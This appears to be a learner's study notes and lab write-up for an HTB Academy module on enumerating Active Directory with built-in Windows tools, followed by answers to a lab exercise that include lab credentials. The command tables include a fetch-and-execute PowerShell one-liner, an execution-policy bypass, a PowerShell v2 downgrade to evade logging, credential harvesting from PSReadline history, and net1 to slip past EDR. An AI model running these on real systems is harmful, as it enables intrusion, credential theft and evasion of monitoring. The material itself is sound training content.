### CPTS / HTB Penetration Tester Path <br>
### Active Directory Enumeration & Attacks: Living Off the Land <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Living Off the Land

Enumerate using only what's already on the host: useful on managed workstations / VDIs without internet, or for stealth.

<br>

---

<br>

### Basic Host & Network Recon

| Command | Result |
|---|---|
| `hostname` | PC name |
| `[System.Environment]::OSVersion.Version` | OS version |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches/hotfixes |
| `ipconfig /all` | NIC config |
| `set` | Env vars (CMD) |
| `echo %USERDOMAIN%` | AD domain (CMD) |
| `echo %logonserver%` | Logon DC (CMD) |
| `systeminfo` | Everything above in one call (fewer log entries) |

<br>

---

<br>

### Harnessing PowerShell

| Cmd-Let | Description |
|---|---|
| `Get-Module` | Loaded modules |
| `Get-ExecutionPolicy -List` | Policy per scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Bypass for current process only (reverts on exit) |
| `Get-ChildItem Env: \| ft Key,Value` | Env values |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | User PS history (creds gold mine) |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL')"` | In-memory download+exec |

<br>

PowerShell downgrade: v2 has no Script Block Logging:

```diff
+ PS> Get-host
+ PS> powershell.exe -version 2
+ PS> Get-host
```

<br>

Note: the `powershell.exe -version 2` invocation itself logs once before the new shell starts.

<br>

---

<br>

### Checking Defenses

Firewall:

```diff
+ PS> netsh advfirewall show allprofiles
```

<br>

Defender service status:

```diff
+ C:\> sc query windefend
```

<br>

Defender config detail:

```diff
+ PS> Get-MpComputerStatus
```

<br>

Other-user check (avoid trampling someone's RDP session):

```diff
+ PS> qwinsta
```

<br>

---

<br>

### Network Information

| Command | Description |
|---|---|
| `arp -a` | Known hosts in arp table |
| `ipconfig /all` | Adapter settings |
| `route print` | IPv4/IPv6 routing table |
| `netsh advfirewall show allprofiles` | Firewall state |

`arp -a` + `route print` are stealth gold for black-box internal: they reveal layer-3 paths to other segments without sending any packets.

<br>

---

<br>

### WMI

| Command | Description |
|---|---|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patches |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Host basics |
| `wmic process list /format:list` | Running processes |
| `wmic ntdomain list /format:list` | Domain + DC info |
| `wmic useraccount list /format:list` | Local + cached domain accounts |
| `wmic group list /format:list` | Local groups |
| `wmic sysaccount list /format:list` | Service accounts |

Trust enumeration:

```diff
+ PS> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

<br>

---

<br>

### Net Commands

Heavy EDR target. `net1` = same binary as `net`, may bypass naive monitoring strings.

| Command | Description |
|---|---|
| `net accounts /domain` | Password + lockout policy |
| `net group /domain` | Domain groups |
| `net group "Domain Admins" /domain` | DA members |
| `net group "domain computers" /domain` | All domain hosts |
| `net group "Domain Controllers" /domain` | DC computer accounts |
| `net localgroup administrators /domain` | Local admins (incl. domain groups) |
| `net localgroup administrators [user] /add` | Add user to admin |
| `net share` | Local shares |
| `net user <user> /domain` | User info |
| `net user /domain` | All domain users |
| `net view` | Computers in domain |
| `net view /domain` | Domain hosts |
| `net view \\computer /ALL` | Shares on host |

<br>

---

<br>

### dsquery

`C:\Windows\System32\dsquery.dll` ships on modern Windows. Needs admin/SYSTEM context.

```diff
+ PS> dsquery user
+ PS> dsquery computer
+ PS> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

<br>

LDAP filters with UAC bitmasks. Find accounts with `PASSWD_NOTREQD` (UAC bit 32):

```diff
+ PS> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

<br>

Find DCs (UAC bit 8192):

```diff
+ PS> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```

<br>

OID match rules:

| OID | Behavior |
|---|---|
| `1.2.840.113556.1.4.803` | `AND`: bitmask must match exactly |
| `1.2.840.113556.1.4.804` | `OR`: any bit match |
| `1.2.840.113556.1.4.1941` | DN match: recursive ownership/membership |

Logical operators in LDAP filters: `&` (AND), `|` (OR), `!` (NOT).

<br>

---

<br>

### Living Off the Land Exercise

IP: 10.129.117.5

RDP `htb-student:Academy_student_AD!`.

---

### Question 1:
Enumerate the host's security configuration information and provide its AMProductVersion.

```diff
+ PS> Get-MpComputerStatus | Format-List
```

	AMProductVersion : 4.18.2109.6

&#x1F6A9; found **4.18.21--edit--6**.

---

### Question 2:
What domain user is explicitly listed as a member of the local Administrators group on the target host?

```diff
+ PS> Get-LocalGroupMember -Group "Administrators"
```

	User        INLANEFREIGHT\adunn           ActiveDirectory

&#x1F6A9; found **ad--edit--**.

---

### Question 3:
Find the flag hidden in the description field of a disabled account with administrative privileges.

#### Combined LDAP filter: person + user + UAC bit 2 (disabled) + adminCount=1.

```diff
+ PS> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)(adminCount=1))" -attr sAMAccountName description
```

	  sAMAccountName    description
	  bross             HTB{LD@P_I$_W1ld}

&#x1F6A9; found **HTB{LD@P--edit--W1ld}**.
